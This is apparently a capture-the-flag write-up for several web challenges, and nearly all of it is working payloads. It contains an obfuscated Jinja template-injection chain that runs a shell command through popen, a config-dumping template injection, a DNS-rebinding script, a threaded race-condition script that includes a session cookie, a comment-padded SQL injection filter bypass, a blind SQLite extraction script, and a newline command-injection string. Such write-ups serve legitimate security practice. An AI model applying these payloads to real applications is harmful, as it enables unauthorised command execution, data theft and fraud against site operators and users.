Only payload some web challenges

## Render V2
- SSTI

```
{{"\u0022\u0022"|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(0)|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(137)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u0070\u006f\u0070\u0065\u006e")("cat flag")|attr("read")()}}
```
Enter in `bio`

## Render V3
- SSTI

```
{%print config%}
```
Enter in `message` and dont need blind :D

## Proxy Service
- DNS rebinding

```py
import requests

URL = 'http://HOST:PORT/proxy'

data = {'url':'http://7f000001.01010101.rbndr.us/gimme_tha_fleg'}

while True:
    r = requests.post(URL, data=data)
    if "inctf{" in r.text:
        print(r.text)
        break
```

## Flag Shop
- Race condition

```py
import requests
from threading import Thread
def f():
        url = 'http://HOST:PORT/transfer'
        data = {"code":"Gift_card_42f5ea20"}
        # change your cookie
        cookies = {"connect.sid":"s%3AZgUAKqckekT8sFOLypKdhsfA7nPycpHy.6Kw%2B%2BWNnPxcqrhk4Rq%2BENlwkXT3BBPykvI1W11XVWPw"}
        r = requests.post(url = url, data = data,cookies =cookies)
        print(r.text)
for i in range(10):
        thread = Thread(target = f)
        thread1 = Thread(target = f)
        thread.start()
        thread1.start()
```
## JustSQL
- Sqli (bypass filter)

```
'/**/oorr/**/1=1--/**/-
```

## lite data
- Blind Sqli (sqlite)

```py
import requests
import string
import re
import json

URL = 'http://HOST:PORT/'
sess = requests.Session()
captcha_regex = r'<label id="captcha" for="captcha">(.*?)</label>'

def getCaptcha():
    r = sess.get(URL)
    captcha = re.findall(captcha_regex,r.text)[0].replace("X", "*")
    return eval(captcha)

def exploit():
    flag = ''
    for i in range(1,500):
        for char in string.printable:
            captcha = getCaptcha()
            print(char,end='\r')
            data = {"email":f"test@gmail.com ' or (substr((select flag from flags1337),{i},1))='{char}'-- -",'captcha':captcha}
            # data = {"email":f"test@gmail.com ' or (substr((SELECT group_concat(sql) FROM sqlite_master where name='flags1337'),{i},1))='{char}'-- -",'captcha':captcha}
            r = sess.post(URL, data=data)
            # print(r.text)
            if 'noobmaster69@gmail.com' in r.text:
                flag += char
                print(flag)
                break

exploit()
```

## Faas
- Command injection

```
name=a%0acat+.fl4g_a1c426w1g.txt
```
I use burp to solve this challenge
